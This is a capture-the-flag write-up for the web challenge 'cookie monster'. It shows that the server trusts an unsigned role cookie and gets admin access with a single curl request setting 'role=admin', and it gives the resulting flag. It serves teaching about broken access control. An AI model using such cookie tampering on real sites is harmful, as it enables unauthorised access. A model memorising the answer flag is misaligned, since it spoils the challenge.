# cookie monster

**Category:** Web · **Points:** 133 · **Solves:** 163 · **Author:** Bhavy

**Flag:** `flag{c00k13_m0n5t3r_v4l1d4t10n}`  *(the server emits it with a literal `flag{...}` wrapper — submit exactly as shown, NOT `LITCTF{...}`)*

## Challenge

> om nom nom
> http://136.115.87.65:31775/

## Solution

The portal sets a role cookie and gates the flag behind an admin role:

```
set-cookie: role=guest; Path=/
...
Current Role: guest
Sorry, only the admin is allowed to enter.
```

The role is trusted straight from the (client-controlled) cookie — no signing, no
server-side session. Just set `role=admin`:

```bash
curl -s -H "Cookie: role=admin" http://136.115.87.65:31775/
```

```html
<p>Current Role: <strong>admin</strong></p>
<p class="flag">Welcome back! Here is your flag: <code>flag{c00k13_m0n5t3r_v4l1d4t10n}</code></p>
```

The server prints (and expects) a **literal `flag{...}`** here, not the usual
`LITCTF{...}` — submit it verbatim.

## Flag

```
flag{c00k13_m0n5t3r_v4l1d4t10n}
```
